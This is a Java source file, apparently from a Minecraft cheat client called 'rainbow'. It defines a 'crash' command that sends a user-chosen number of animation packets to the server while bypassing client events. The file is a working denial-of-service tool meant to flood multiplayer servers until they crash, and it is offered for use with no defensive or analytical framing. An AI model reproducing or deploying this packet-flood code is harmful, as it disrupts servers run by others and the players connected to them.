package slavikcodd3r.rainbow.command.commands;

import java.io.IOException;

import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C0APacketAnimation;
import slavikcodd3r.rainbow.command.Com;
import slavikcodd3r.rainbow.command.Command;
import slavikcodd3r.rainbow.utils.ClientUtils;
import slavikcodd3r.rainbow.utils.NetUtil;

@Com(names = { "crash" })
public class Crash extends Command
{
	
	Minecraft mc = Minecraft.getMinecraft();
	
    public void runCommand(final String[] args) {
    	int packets = Integer.parseInt(args[1]);
    	for (int i = 0; i < packets; ++i) {
    		NetUtil.sendPacketNoEvents(new C0APacketAnimation());
        }
    }
    
    @Override
    public String getHelp() {
        return "crash";
    }
}
